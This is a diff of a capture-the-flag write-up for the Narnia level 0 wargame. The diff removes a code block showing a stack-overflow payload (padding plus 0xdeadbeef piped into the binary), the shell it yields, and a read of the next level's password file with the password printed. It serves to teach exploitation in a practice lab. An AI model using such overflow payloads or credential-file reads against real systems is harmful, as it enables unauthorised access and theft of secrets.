@@ -34,18 +34,7 @@ Great we have overwritten the val variable with 0x43434343 which is our 4 "C". N
 
 ### Grabbing the flag:
 
-```python
-narnia0@narnia:/narnia$ (python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
-Correct val's value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
-val: 0xdeadbeef
-id
-uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
-whoami
-narnia1
-cat /etc/narnia_pass/narnia1
-efeidiedae
-```
+![source-02](/img/f2.png){: .align-left}
 
 > Full exploit
 
